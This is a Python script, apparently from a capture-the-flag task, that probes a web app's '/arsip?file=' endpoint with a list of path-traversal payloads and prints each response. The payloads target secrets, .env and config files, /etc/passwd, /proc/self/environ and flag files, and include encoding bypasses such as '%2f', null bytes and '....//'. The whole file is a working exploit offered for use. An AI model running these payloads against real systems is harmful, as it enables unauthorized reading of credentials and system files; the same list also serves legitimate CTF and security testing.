#!/usr/bin/env python3
import re
import sys
import urllib.parse

sys.path.insert(0, "/tmp/opencode")
from ctf import BASE, get

CANDS = [
    # parent (app root) candidates
    "../secret.txt", "../key.txt", "../keys.txt", "../.env", "../.env.txt", "../env.txt",
    "../app.py", "../app.txt", "../server.py", "../config.txt", "../config.py", "../config.json",
    "../notes.txt", "../rahasia.txt", "../kunci.txt", "../session_secret.txt",
    "../users.txt", "../users.json", "../accounts.txt", "../admin.txt", "../flag.txt",
    "../flag", "../flag.txt.bak", "../Dockerfile", "../requirements.txt", "../readme.txt",
    "../README.md", "../backup.txt", "../dump.txt", "../.gitignore", "../static/secret.txt",
    # private dir candidates
    "../private/secret.txt", "../private/key.txt", "../private/kunci.txt", "../private/.env",
    "../private/rahasia.txt", "../private/admin.txt", "../private/users.txt", "../private/notes.txt",
    "../private/catatan.txt", "../private/flag", "../private/flag.txt", "../private/backup.txt",
    "../private/config.json", "../private/session.txt", "../private/flag.png",
    # data dir candidates
    "secret.txt", "admin.txt", "flag.txt", "catatan-admin.txt", "laporan-q3.txt", "rahasia.txt",
    # escape the box
    "../../flag.txt", "../../etc/passwd", "../../etc/hosts", "../../../../etc/passwd",
    "../../../../etc/flag", "../../../../flag.txt", "/flag.txt", "/flag",
    "../../../../proc/self/environ", "../../../../proc/self/cmdline", "../../../../proc/self/status",
    "../../../../root/flag.txt", "/app/private/flag.txt", "..\\private\\flag.txt",
    # encodings
    "..%2fprivate/flag.txt", ".././private/flag.txt", "..;/private/flag.txt",
    "....//private/flag.txt", "../private/flag.txt%00.txt", "../private/flag.txt.",
    "../private//flag.txt", "../private/./flag.txt",
]

for c in CANDS:
    q = urllib.parse.quote(c, safe="")
    code, body, _ = get("/arsip?file=" + q)
    txt = re.sub(r"\s+", " ", body)
    txt = txt.replace("🏪 Koperasi Nusantara Beranda Produk Laporan Login", "").strip()
    print(f"{code} {c:38s} :: {txt[:180]}")
